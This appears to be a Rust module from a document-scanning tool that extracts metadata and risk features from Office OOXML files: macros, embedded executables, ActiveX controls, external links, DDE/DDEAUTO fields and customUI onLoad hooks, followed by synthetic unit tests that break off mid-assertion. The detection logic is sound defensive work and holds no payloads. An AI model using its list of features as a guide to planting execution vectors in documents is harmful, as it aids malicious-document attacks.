//! OOXML (`.docx`/`.xlsx`/`.pptx`/`.docm`/…) extractor.
//!
//! OOXML files are ZIP archives with a fixed internal layout: a top-level
//! `[Content_Types].xml` manifests every content stream by MIME type,
//! `docProps/core.xml` carries the Dublin Core metadata pane, and
//! `docProps/app.xml` carries the originating application info. Macros
//! live under `*/vbaProject.bin` and the `[Content_Types].xml` MIME
//! string distinguishes the document variant (Word / Excel /
//! PowerPoint, with-macros vs without).
//!
//! Layered on top of the generic [`crate::formats::zip::extract`]
//! walk (which has already emitted `archive.members[]` and
//! `archive.compression.*`). This module reads a small number of
//! named streams from the same archive and surfaces an `office.*`
//! schema for trait rules:
//!
//! - `office.kind` — `"docx" | "xlsx" | "pptx" | "ooxml"` from the
//!   `[Content_Types].xml` document-type declaration.
//! - `office.{title, creator, last_modified_by, created, modified,
//!   subject, description, keywords, category}` — Dublin Core fields
//!   from `docProps/core.xml`.
//! - `office.application`, `office.company` — from `docProps/app.xml`.
//! - `office.features[]` — Pike-style array of structural features
//!   (`"macros"`, `"external_template"`, `"ole_objects"`, …).
//! - `office.macros[]` — paths of `vbaProject.bin` streams when
//!   present (one per OOXML application; usually a single entry).

use std::collections::{BTreeSet, HashMap, HashSet};
use std::io::{Cursor, Read};

use serde_json::Value as JsonValue;

use crate::error::Error;
use crate::formats::common::put_str;
use crate::output::{Metrics, Values};

pub(super) fn extract(
    bytes: &[u8],
    values: &mut Values,
    metrics: &mut Metrics,
) -> Result<(), Error> {
    let cursor = Cursor::new(bytes);
    let Ok(mut zip) = ::zip::ZipArchive::new(cursor) else {
        return Ok(());
    };
    let names = zip_entry_names(&mut zip);
    let Some(index) = build_ooxml_index(&mut zip, &names) else {
        return Ok(());
    };

    if let Some(kind) = detect_kind(&index) {
        put_str(values, "office.kind", kind);
    } else {
        return Ok(());
    }

    if let Some(core) = parse_core_props(&mut zip) {
        for (key, value) in core {
            let path = format!("office.{key}");
            values.insert(&path, value);
        }
    }

    if let Some((app, company)) = parse_app_props(&mut zip) {
        if let Some(app) = app {
            put_str(values, "office.application", app);
        }
        if let Some(company) = company {
            put_str(values, "office.company", company);
        }
    }

    let mut features: Vec<&'static str> = Vec::new();
    let mut macros_seen = BTreeSet::new();
    let mut macros: Vec<JsonValue> = Vec::new();
    let mut embedded_seen = HashSet::new();
    let mut embedded: Vec<JsonValue> = Vec::new();
    let mut controls_seen = HashSet::new();
    let mut controls: Vec<JsonValue> = Vec::new();

    for name in &names {
        let content_type = index.content_type_for(name).unwrap_or_default();
        if is_macro_content_type(content_type)
            || name.ends_with("/vbaProject.bin")
            || name == "vbaProject.bin"
        {
            push_unique_string(&mut macros_seen, &mut macros, name);
        }
        if is_control_content_type(content_type) {
            push_control(&mut controls_seen, &mut controls, name, "active_x", None);
        }
        if name.contains("/embeddings/") {
            push_feature(&mut features, "ole_objects");
            push_embedded(
                &mut zip,
                &mut embedded_seen,
                &mut embedded,
                name,
                None,
                None,
            );
        }
        if name.starts_with("xl/externalLinks/") {
            push_feature(&mut features, "external_links");
        }
    }

    for rel in &index.relationships {
        match rel.short_type.as_str() {
            "vbaProject" | "xlIntlMacrosheet" => {
                if let Some(target) = rel.target_part.as_deref() {
                    push_unique_string(&mut macros_seen, &mut macros, target);
                } else {
                    push_unique_string(&mut macros_seen, &mut macros, &rel.target);
                }
            }
            "oleObject" => {
                push_feature(&mut features, "ole_objects");
                if let Some(target) = rel.target_part.as_deref() {
                    push_embedded(
                        &mut zip,
                        &mut embedded_seen,
                        &mut embedded,
                        target,
                        Some("oleObject"),
                        Some(&rel.source),
                    );
                }
            }
            "package" => {
                push_feature(&mut features, "embedded_packages");
                if let Some(target) = rel.target_part.as_deref() {
                    push_embedded(
                        &mut zip,
                        &mut embedded_seen,
                        &mut embedded,
                        target,
                        Some("package"),
                        Some(&rel.source),
                    );
                }
            }
            "control" => {
                push_feature(&mut features, "active_x");
                if let Some(target) = rel.target_part.as_deref() {
                    push_control(
                        &mut controls_seen,
                        &mut controls,
                        target,
                        "active_x",
                        Some(&rel.source),
                    );
                }
            }
            "externalLink" => push_feature(&mut features, "external_links"),
            _ => {}
        }
    }

    if !embedded.is_empty() {
        let count = embedded.len() as f64;
        let exec_count = embedded
            .iter()
            .filter(|e| {
                e.get("kind")
                    .and_then(|x| x.as_str())
                    .is_some_and(|k| matches!(k, "pe" | "elf" | "macho"))
            })
            .count() as f64;
        values.insert("office.embedded", JsonValue::Array(embedded));
        metrics.insert("office.embedded_count", count);
        if exec_count > 0.0 {
            metrics.insert("office.embedded_executable_count", exec_count);
            push_feature(&mut features, "embedded_executable");
        }
    }

    if !controls.is_empty() {
        let count = controls.len() as f64;
        values.insert("office.controls", JsonValue::Array(controls));
        metrics.insert("office.control_count", count);
        push_feature(&mut features, "active_x");
    }

    let external_relationships: Vec<JsonValue> = index
        .relationships
        .iter()
        .filter(|rel| rel.mode.as_deref() == Some("External") || is_external_target(&rel.target))
        .map(external_relationship_value)
        .collect();
    if !external_relationships.is_empty() {
        let count = external_relationships.len() as f64;
        values.insert(
            "office.external_relationships",
            JsonValue::Array(external_relationships),
        );
        metrics.insert("office.external_relationship_count", count);
        push_feature(&mut features, "external_relationships");
    }

    if !macros.is_empty() {
        push_feature(&mut features, "macros");
        let count = macros.len() as f64;
        values.insert("office.macros", JsonValue::Array(macros));
        metrics.insert("office.macro_count", count);
    }

    let mut dde_links: Vec<JsonValue> = Vec::new();
    let mut custom_ui_onload: Vec<JsonValue> = Vec::new();
    for name in &names {
        if !name.ends_with(".xml") || name.ends_with(".rels") {
            continue;
        }
        let Some(text) = read_entry_text_limited(&mut zip, name, 1024 * 1024) else {
            continue;
        };
        dde_links.extend(extract_dde_links(&text, name));
        custom_ui_onload.extend(extract_custom_ui_onload(&text, name));
    }
    if !dde_links.is_empty() {
        let count = dde_links.len() as f64;
        values.insert("office.dde_links", JsonValue::Array(dde_links));
        metrics.insert("office.dde_link_count", count);
        push_feature(&mut features, "dde_links");
    }
    if !custom_ui_onload.is_empty() {
        let count = custom_ui_onload.len() as f64;
        values.insert(
            "office.custom_ui_onload",
            JsonValue::Array(custom_ui_onload),
        );
        metrics.insert("office.custom_ui_onload_count", count);
        push_feature(&mut features, "custom_ui_onload");
    }

    if !features.is_empty() {
        values.insert(
            "office.features",
            JsonValue::Array(
                features
                    .into_iter()
                    .map(|s| JsonValue::String(s.into()))
                    .collect(),
            ),
        );
    }

    Ok(())
}

#[derive(Debug, Default)]
struct OoxmlIndex {
    defaults: HashMap<String, String>,
    overrides: HashMap<String, String>,
    relationships: Vec<RelationshipInfo>,
}

#[derive(Debug)]
struct RelationshipInfo {
    source: String,
    rels_source: String,
    target: String,
    target_part: Option<String>,
    rel_type: String,
    short_type: String,
    mode: Option<String>,
}

impl OoxmlIndex {
    fn content_type_for(&self, name: &str) -> Option<&str> {
        let normalized = name.trim_start_matches('/');
        if let Some(content_type) = self.overrides.get(normalized) {
            return Some(content_type);
        }
        let ext = normalized.rsplit_once('.')?.1.to_ascii_lowercase();
        self.defaults.get(&ext).map(String::as_str)
    }
}

fn zip_entry_names<R: Read + std::io::Seek>(zip: &mut ::zip::ZipArchive<R>) -> Vec<String> {
    let mut names = Vec::with_capacity(zip.len());
    for i in 0..zip.len() {
        if let Ok(entry) = zip.by_index(i) {
            names.push(entry.name().to_string());
        }
    }
    names
}

fn build_ooxml_index<R: Read + std::io::Seek>(
    zip: &mut ::zip::ZipArchive<R>,
    names: &[String],
) -> Option<OoxmlIndex> {
    let content_types = read_entry_text(zip, "[Content_Types].xml")?;
    let mut index = parse_content_types(&content_types)?;
    for name in names {
        if !name.ends_with(".rels") {
            continue;
        }
        let Some(text) = read_entry_text_limited(zip, name, 64 * 1024) else {
            continue;
        };
        index.relationships.extend(parse_relationships(&text, name));
    }
    Some(index)
}

fn parse_content_types(xml: &str) -> Option<OoxmlIndex> {
    let doc = roxmltree::Document::parse(xml).ok()?;
    let mut index = OoxmlIndex::default();
    for node in doc.descendants() {
        match node.tag_name().name() {
            "Default" => {
                let Some(ext) = node.attribute("Extension") else {
                    continue;
                };
                let Some(content_type) = node.attribute("ContentType") else {
                    continue;
                };
                index
                    .defaults
                    .insert(ext.to_ascii_lowercase(), content_type.to_string());
            }
            "Override" => {
                let Some(part) = node.attribute("PartName") else {
                    continue;
                };
                let Some(content_type) = node.attribute("ContentType") else {
                    continue;
                };
                index.overrides.insert(
                    part.trim_start_matches('/').to_string(),
                    content_type.to_string(),
                );
            }
            _ => {}
        }
    }
    Some(index)
}

fn parse_relationships(xml: &str, rels_source: &str) -> Vec<RelationshipInfo> {
    let Ok(doc) = roxmltree::Document::parse(xml) else {
        return Vec::new();
    };
    let source = relationship_source_part(rels_source);
    let mut out = Vec::new();
    for node in doc.descendants() {
        if node.tag_name().name() != "Relationship" {
            continue;
        }
        let Some(target) = node.attribute("Target") else {
            continue;
        };
        let rel_type = node.attribute("Type").unwrap_or_default().to_string();
        let short_type = rel_type
            .rsplit('/')
            .next()
            .unwrap_or(rel_type.as_str())
            .to_string();
        let mode = node.attribute("TargetMode").map(str::to_string);
        let target_part = if mode.as_deref() == Some("External") || is_external_target(target) {
            None
        } else {
            resolve_relationship_target(&source, target)
        };
        out.push(RelationshipInfo {
            source: source.clone(),
            rels_source: rels_source.to_string(),
            target: target.to_string(),
            target_part,
            rel_type,
            short_type,
            mode,
        });
    }
    out
}

fn relationship_source_part(rels_source: &str) -> String {
    if rels_source == "_rels/.rels" {
        return String::new();
    }
    let Some((prefix, file)) = rels_source.rsplit_once("/_rels/") else {
        return String::new();
    };
    let source_name = file.strip_suffix(".rels").unwrap_or(file);
    if prefix.is_empty() {
        source_name.to_string()
    } else {
        format!("{prefix}/{source_name}")
    }
}

fn resolve_relationship_target(source: &str, target: &str) -> Option<String> {
    let target = target.trim();
    if target.is_empty() || target.eq_ignore_ascii_case("NULL") {
        return None;
    }
    let joined = if target.starts_with('/') {
        target.trim_start_matches('/').to_string()
    } else if let Some((dir, _)) = source.rsplit_once('/') {
        format!("{dir}/{target}")
    } else {
        target.to_string()
    };
    normalize_part_name(&joined)
}

fn normalize_part_name(path: &str) -> Option<String> {
    let mut parts = Vec::new();
    for part in path.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            _ => parts.push(part),
        }
    }
    if parts.is_empty() {
        None
    } else {
        Some(parts.join("/"))
    }
}

fn push_feature(features: &mut Vec<&'static str>, feature: &'static str) {
    if !features.contains(&feature) {
        features.push(feature);
    }
}

fn push_unique_string(seen: &mut BTreeSet<String>, out: &mut Vec<JsonValue>, value: &str) {
    if seen.insert(value.to_string()) {
        out.push(JsonValue::String(value.to_string()));
    }
}

fn push_control(
    seen: &mut HashSet<String>,
    out: &mut Vec<JsonValue>,
    filename: &str,
    kind: &str,
    source: Option<&str>,
) {
    if !seen.insert(filename.to_string()) {
        return;
    }
    let mut obj = serde_json::Map::new();
    obj.insert("filename".into(), JsonValue::String(filename.to_string()));
    obj.insert("kind".into(), JsonValue::String(kind.to_string()));
    if let Some(source) = source {
        obj.insert("source".into(), JsonValue::String(source.to_string()));
    }
    out.push(JsonValue::Object(obj));
}

fn push_embedded<R: Read + std::io::Seek>(
    zip: &mut ::zip::ZipArchive<R>,
    seen: &mut HashSet<String>,
    out: &mut Vec<JsonValue>,
    filename: &str,
    relationship_type: Option<&str>,
    source: Option<&str>,
) {
    if !seen.insert(filename.to_string()) {
        if relationship_type.is_some() || source.is_some() {
            for item in out.iter_mut() {
                let Some(obj) = item.as_object_mut() else {
                    continue;
                };
                if obj.get("filename").and_then(|v| v.as_str()) != Some(filename) {
                    continue;
                }
                if let Some(relationship_type) = relationship_type {
                    obj.insert(
                        "relationship_type".into(),
                        JsonValue::String(relationship_type.to_string()),
                    );
                }
                if let Some(source) = source {
                    obj.insert("source".into(), JsonValue::String(source.to_string()));
                }
                break;
            }
        }
        return;
    }
    let mut obj = serde_json::Map::new();
    obj.insert("filename".into(), JsonValue::String(filename.to_string()));
    if let Some(relationship_type) = relationship_type {
        obj.insert(
            "relationship_type".into(),
            JsonValue::String(relationship_type.to_string()),
        );
    }
    if let Some(source) = source {
        obj.insert("source".into(), JsonValue::String(source.to_string()));
    }
    if let Ok(mut entry) = zip.by_name(filename) {
        obj.insert("size_bytes".into(), JsonValue::Number(entry.size().into()));
        let mut header = [0u8; 8];
        let n = entry.read(&mut header).unwrap_or(0);
        if let Some(kind) = embedded_kind(&header[..n]) {
            obj.insert("kind".into(), JsonValue::String(kind.into()));
        }
    }
    out.push(JsonValue::Object(obj));
}

fn is_macro_content_type(content_type: &str) -> bool {
    content_type.contains("vbaProject") || content_type.contains("intlmacrosheet")
}

fn is_control_content_type(content_type: &str) -> bool {
    content_type.contains("vnd.ms-office.activeX")
}

fn external_relationship_value(rel: &RelationshipInfo) -> JsonValue {
    let mut obj = serde_json::Map::new();
    obj.insert("type".into(), JsonValue::String(rel.short_type.clone()));
    obj.insert("target".into(), JsonValue::String(rel.target.clone()));
    obj.insert("source".into(), JsonValue::String(rel.rels_source.clone()));
    if !rel.source.is_empty() {
        obj.insert("part".into(), JsonValue::String(rel.source.clone()));
    }
    if !rel.rel_type.is_empty() {
        obj.insert(
            "relationship".into(),
            JsonValue::String(rel.rel_type.clone()),
        );
    }
    if let Some(mode) = &rel.mode {
        obj.insert("mode".into(), JsonValue::String(mode.clone()));
    }
    JsonValue::Object(obj)
}

/// Classify the first few bytes of an embedded payload by magic.
/// Returns a short kind label suitable for traits to match against
/// (`"pe"`, `"elf"`, `"macho"`, `"ole2"`, `"zip"`) or `None` when the
/// bytes don't match any known executable / container shape.
fn embedded_kind(bytes: &[u8]) -> Option<&'static str> {
    if bytes.len() >= 2 && &bytes[..2] == b"MZ" {
        return Some("pe");
    }
    if bytes.len() >= 4 && &bytes[..4] == b"\x7fELF" {
        return Some("elf");
    }
    if bytes.len() >= 4 {
        let m = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
        // MH_MAGIC / MH_CIGAM / MH_MAGIC_64 / MH_CIGAM_64
        if matches!(m, 0xFEED_FACE | 0xCEFA_EDFE | 0xFEED_FACF | 0xCFFA_EDFE) {
            return Some("macho");
        }
        // Universal binary (fat) — sometimes ships as a single embedded
        // mach-o multi-arch payload.
        if matches!(m, 0xCAFE_BABE | 0xBEBA_FECA) {
            // 0xCAFEBABE clashes with Java .class; in embedded-doc
            // context Java class files are extremely uncommon while
            // fat Mach-O bundles are the documented attack surface.
            return Some("macho");
        }
    }
    if bytes.len() >= 4 && &bytes[..4] == b"PK\x03\x04" {
        return Some("zip");
    }
    if bytes.len() >= 8 && &bytes[..8] == b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1" {
        return Some("ole2");
    }
    None
}

/// Read `[Content_Types].xml` and map its primary content type onto a
/// short OOXML variant label. Falls back to `"ooxml"` for OOXML files
/// we don't have a more specific label for (Visio, custom packages, …).
fn detect_kind(index: &OoxmlIndex) -> Option<&'static str> {
    let all_types = index
        .overrides
        .values()
        .chain(index.defaults.values())
        .map(String::as_str);
    let mut saw_ooxml_type = false;
    for content_type in all_types {
        saw_ooxml_type = true;
        if content_type.contains("wordprocessingml.document")
            || content_type.contains("wordprocessingml.template")
            || content_type.contains("ms-word.document")
            || content_type.contains("ms-word.template")
        {
            return Some("docx");
        }
        if content_type.contains("spreadsheetml.sheet")
            || content_type.contains("spreadsheetml.template")
            || content_type.contains("ms-excel.sheet")
            || content_type.contains("ms-excel.template")
            || content_type.contains("ms-excel.addin")
        {
            return Some("xlsx");
        }
        if content_type.contains("presentationml.presentation")
            || content_type.contains("presentationml.template")
            || content_type.contains("presentationml.slideshow")
            || content_type.contains("ms-powerpoint.presentation")
            || content_type.contains("ms-powerpoint.template")
            || content_type.contains("ms-powerpoint.slideshow")
        {
            return Some("pptx");
        }
    }
    saw_ooxml_type.then_some("ooxml")
}

/// Parse `docProps/core.xml` into a Map of canonical Dublin Core
/// fields. Empty values are dropped so a trait `exists:` check is
/// meaningful.
fn parse_core_props<R: Read + std::io::Seek>(
    zip: &mut ::zip::ZipArchive<R>,
) -> Option<serde_json::Map<String, JsonValue>> {
    let text = read_entry_text(zip, "docProps/core.xml")?;
    let doc = roxmltree::Document::parse(&text).ok()?;
    let mut out = serde_json::Map::new();
    for node in doc.descendants() {
        let name = node.tag_name().name();
        // Dublin Core elements live in two namespaces (`dc:` and
        // `cp:`); `tag_name().name()` strips the prefix so we match
        // by local-name alone.
        let key = match name {
            "title" => "title",
            "creator" => "creator",
            "subject" => "subject",
            "description" => "description",
            "keywords" => "keywords",
            "lastModifiedBy" => "last_modified_by",
            "created" => "created",
            "modified" => "modified",
            "category" => "category",
            "contentStatus" => "content_status",
            "revision" => "revision",
            _ => continue,
        };
        let Some(text) = node.text() else {
            continue;
        };
        let trimmed = text.trim();
        if !trimmed.is_empty() && !out.contains_key(key) {
            out.insert(key.into(), JsonValue::String(trimmed.to_string()));
        }
    }
    Some(out)
}

/// Parse `docProps/app.xml` for the `Application` (e.g. "Microsoft
/// Macintosh Word") and `Company` strings. Optional both —
/// hand-rolled OOXML packages (LibreOffice exports, GitHub Actions
/// generators, …) often skip `app.xml` entirely.
fn parse_app_props<R: Read + std::io::Seek>(
    zip: &mut ::zip::ZipArchive<R>,
) -> Option<(Option<String>, Option<String>)> {
    let text = read_entry_text(zip, "docProps/app.xml")?;
    let doc = roxmltree::Document::parse(&text).ok()?;
    let mut application: Option<String> = None;
    let mut company: Option<String> = None;
    for node in doc.descendants() {
        match node.tag_name().name() {
            "Application" => application = node.text().map(|s| s.trim().to_string()),
            "Company" => company = node.text().map(|s| s.trim().to_string()),
            _ => {}
        }
    }
    Some((
        application.filter(|s| !s.is_empty()),
        company.filter(|s| !s.is_empty()),
    ))
}

/// True when a relationship target points at something outside the archive.
fn is_external_target(target: &str) -> bool {
    let t = target.trim();
    if t.is_empty() {
        return false;
    }
    if t.starts_with("\\\\") || t.starts_with("//") {
        return true;
    }
    let Some(colon) = t.find(':') else {
        return false;
    };
    if colon == 1 && t.as_bytes()[0].is_ascii_alphabetic() {
        return false;
    }
    t[..colon].bytes().enumerate().all(|(i, b)| {
        b.is_ascii_alphabetic()
            || (i > 0 && (b.is_ascii_digit() || b == b'+' || b == b'.' || b == b'-'))
    })
}

fn extract_dde_links(xml: &str, source: &str) -> Vec<JsonValue> {
    let Ok(doc) = roxmltree::Document::parse(xml) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for node in doc.descendants() {
        match node.tag_name().name() {
            "fldSimple" => {
                for attr in node.attributes() {
                    if attr.name() == "instr" {
                        push_dde_field(&mut out, source, "field", attr.value());
                    }
                }
            }
            "instrText" => {
                if let Some(text) = node.text() {
                    push_dde_field(&mut out, source, "field", text);
                }
            }
            "ddeLink" => {
                let mut obj = serde_json::Map::new();
                obj.insert("source".into(), JsonValue::String(source.to_string()));
                obj.insert("kind".into(), JsonValue::String("excel".into()));
                for attr in node.attributes() {
                    match attr.name() {
                        "ddeService" => {
                            obj.insert(
                                "service".into(),
                                JsonValue::String(attr.value().to_string()),
                            );
                        }
                        "ddeTopic" => {
                            obj.insert("topic".into(), JsonValue::String(attr.value().to_string()));
                        }
                        _ => {}
                    }
                }
                out.push(JsonValue::Object(obj));
            }
            _ => {}
        }
    }
    out
}

fn push_dde_field(out: &mut Vec<JsonValue>, source: &str, kind: &str, text: &str) {
    let trimmed = text.trim();
    let lower = trimmed.to_ascii_lowercase();
    if !(lower.starts_with("dde ")
        || lower.starts_with("ddeauto ")
        || lower == "dde"
        || lower == "ddeauto")
    {
        return;
    }
    let mut obj = serde_json::Map::new();
    obj.insert("source".into(), JsonValue::String(source.to_string()));
    obj.insert("kind".into(), JsonValue::String(kind.to_string()));
    obj.insert("text".into(), JsonValue::String(trimmed.to_string()));
    out.push(JsonValue::Object(obj));
}

fn extract_custom_ui_onload(xml: &str, source: &str) -> Vec<JsonValue> {
    let Ok(doc) = roxmltree::Document::parse(xml) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for node in doc.descendants() {
        if node.tag_name().name() != "customUI" {
            continue;
        }
        let Some(on_load) = node.attribute("onLoad") else {
            continue;
        };
        let trimmed = on_load.trim();
        if trimmed.is_empty() {
            continue;
        }
        let mut obj = serde_json::Map::new();
        obj.insert("source".into(), JsonValue::String(source.to_string()));
        obj.insert("on_load".into(), JsonValue::String(trimmed.to_string()));
        out.push(JsonValue::Object(obj));
    }
    out
}

/// Read a named entry's content as text. Bounded by the zip crate's own
/// per-entry size limits and a caller-provided cap.
fn read_entry_text<R: Read + std::io::Seek>(
    zip: &mut ::zip::ZipArchive<R>,
    name: &str,
) -> Option<String> {
    read_entry_text_limited(zip, name, 16 * 1024)
}

fn read_entry_text_limited<R: Read + std::io::Seek>(
    zip: &mut ::zip::ZipArchive<R>,
    name: &str,
    max_bytes: u64,
) -> Option<String> {
    let entry = zip.by_name(name).ok()?;
    let mut buf = Vec::with_capacity(entry.size().min(max_bytes) as usize);
    let _ = entry.take(max_bytes).read_to_end(&mut buf).ok()?;
    decode_xml_bytes(&buf)
}

fn decode_xml_bytes(buf: &[u8]) -> Option<String> {
    if buf.starts_with(&[0xFF, 0xFE]) {
        return decode_utf16(&buf[2..], true);
    }
    if buf.starts_with(&[0xFE, 0xFF]) {
        return decode_utf16(&buf[2..], false);
    }
    if looks_utf16le(buf) {
        return decode_utf16(buf, true);
    }
    if looks_utf16be(buf) {
        return decode_utf16(buf, false);
    }
    String::from_utf8(buf.to_vec()).ok()
}

fn looks_utf16le(buf: &[u8]) -> bool {
    buf.len() >= 8 && buf[0] == b'<' && buf[1] == 0 && buf[2] == b'?' && buf[3] == 0
}

fn looks_utf16be(buf: &[u8]) -> bool {
    buf.len() >= 8 && buf[0] == 0 && buf[1] == b'<' && buf[2] == 0 && buf[3] == b'?'
}

fn decode_utf16(buf: &[u8], little_endian: bool) -> Option<String> {
    let mut units = Vec::with_capacity(buf.len() / 2);
    for pair in buf.chunks_exact(2) {
        let unit = if little_endian {
            u16::from_le_bytes([pair[0], pair[1]])
        } else {
            u16::from_be_bytes([pair[0], pair[1]])
        };
        units.push(unit);
    }
    String::from_utf16(&units).ok()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::output::{Metrics, Values};
    use std::io::Cursor;
    use std::io::Write;
    use zip::write::{SimpleFileOptions, ZipWriter};
    use zip::CompressionMethod;

    fn run(bytes: &[u8]) -> (Values, Metrics) {
        let mut v = Values::new();
        let mut m = Metrics::new();
        let _ = extract(bytes, &mut v, &mut m);
        (v, m)
    }

    fn build_ooxml(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut buf = Cursor::new(Vec::<u8>::new());
        {
            let mut w = ZipWriter::new(&mut buf);
            let opts = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
            for (path, body) in members {
                w.start_file(*path, opts).unwrap();
                w.write_all(body).unwrap();
            }
            w.finish().unwrap();
        }
        buf.into_inner()
    }

    const CONTENT_TYPES_DOCX: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>"#;

    const CONTENT_TYPES_XLSX: &str = r#"<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
</Types>"#;

    const CORE_XML: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties
    xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
    xmlns:dc="http://purl.org/dc/elements/1.1/"
    xmlns:dcterms="http://purl.org/dc/terms/">
  <dc:title>Quarterly Report</dc:title>
  <dc:creator>Alice</dc:creator>
  <cp:lastModifiedBy>Bob</cp:lastModifiedBy>
  <dcterms:created>2024-01-15T08:00:00Z</dcterms:created>
  <dcterms:modified>2024-01-16T09:30:00Z</dcterms:modified>
  <dc:description>FY24 numbers</dc:description>
</cp:coreProperties>"#;

    const APP_XML: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">
  <Application>Microsoft Macintosh Word</Application>
  <Company>Acme Corp</Company>
</Properties>"#;

    #[test]
    fn detects_docx_kind() {
        let z = build_ooxml(&[("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes())]);
        let (v, _) = run(&z);
        assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("docx"));
    }

    #[test]
    fn detects_xlsx_kind() {
        let z = build_ooxml(&[("[Content_Types].xml", CONTENT_TYPES_XLSX.as_bytes())]);
        let (v, _) = run(&z);
        assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("xlsx"));
    }

    #[test]
    fn extracts_core_properties() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("docProps/core.xml", CORE_XML.as_bytes()),
        ]);
        let (v, _) = run(&z);
        assert_eq!(
            v.get("office.title").and_then(|x| x.as_str()),
            Some("Quarterly Report")
        );
        assert_eq!(
            v.get("office.creator").and_then(|x| x.as_str()),
            Some("Alice")
        );
        assert_eq!(
            v.get("office.last_modified_by").and_then(|x| x.as_str()),
            Some("Bob")
        );
        assert_eq!(
            v.get("office.created").and_then(|x| x.as_str()),
            Some("2024-01-15T08:00:00Z")
        );
        assert_eq!(
            v.get("office.modified").and_then(|x| x.as_str()),
            Some("2024-01-16T09:30:00Z")
        );
    }

    #[test]
    fn extracts_application_and_company() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("docProps/app.xml", APP_XML.as_bytes()),
        ]);
        let (v, _) = run(&z);
        assert_eq!(
            v.get("office.application").and_then(|x| x.as_str()),
            Some("Microsoft Macintosh Word")
        );
        assert_eq!(
            v.get("office.company").and_then(|x| x.as_str()),
            Some("Acme Corp")
        );
    }

    #[test]
    fn flags_macros_when_vba_project_present() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/vbaProject.bin", b"\x01\x16\x03\x00fake-macro-blob"),
        ]);
        let (v, m) = run(&z);
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"macros"));
        assert_eq!(m.get("office.macro_count"), Some(1.0));
        let macros = v.get("office.macros").and_then(|x| x.as_array()).unwrap();
        assert_eq!(macros[0].as_str(), Some("word/vbaProject.bin"));
    }

    #[test]
    fn flags_ole_objects() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/embeddings/oleObject1.bin", b"junk"),
        ]);
        let (v, _) = run(&z);
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"ole_objects"));
    }

    #[test]
    fn flags_xlsx_external_links() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_XLSX.as_bytes()),
            ("xl/externalLinks/externalLink1.xml", b"<xml />"),
        ]);
        let (v, _) = run(&z);
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"external_links"));
    }

    #[test]
    fn non_ooxml_zip_silent() {
        // A regular zip with no [Content_Types].xml — should NOT
        // emit any `office.*` keys.
        let z = build_ooxml(&[("hello.txt", b"world")]);
        let (v, _) = run(&z);
        assert!(v.get("office.kind").is_none());
        assert!(v.get("office.title").is_none());
    }

    #[test]
    fn malformed_xml_in_core_is_swallowed() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("docProps/core.xml", b"<not-actually-xml"),
        ]);
        let (v, _) = run(&z);
        // Kind still set; core properties simply missing.
        assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("docx"));
        assert!(v.get("office.title").is_none());
    }

    #[test]
    fn unknown_ooxml_falls_back_to_generic_label() {
        // Visio-style package — has [Content_Types].xml but no
        // word/xl/ppt content type. Should still emit `office.kind`
        // with the fallback "ooxml" label.
        let visio_ct = r#"<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/visio/document.xml"
    ContentType="application/vnd.ms-visio.drawing.main+xml"/>
</Types>"#;
        let z = build_ooxml(&[("[Content_Types].xml", visio_ct.as_bytes())]);
        let (v, _) = run(&z);
        assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("ooxml"));
    }

    #[test]
    fn empty_core_xml_omits_values() {
        // Empty docProps/core.xml shouldn't emit office.
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("docProps/core.xml", b"<cp:coreProperties xmlns:cp=\"x\"/>"),
        ]);
        let (v, _) = run(&z);
        assert!(v.get("office.title").is_none());
    }

    #[test]
    fn enumerates_embedded_pe_executable() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            (
                "word/embeddings/oleObject1.bin",
                b"MZ\x90\x00\x03\x00\x00\x00fake-pe",
            ),
        ]);
        let (v, m) = run(&z);
        let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
        assert_eq!(embedded.len(), 1);
        assert_eq!(embedded[0]["kind"].as_str(), Some("pe"));
        assert_eq!(
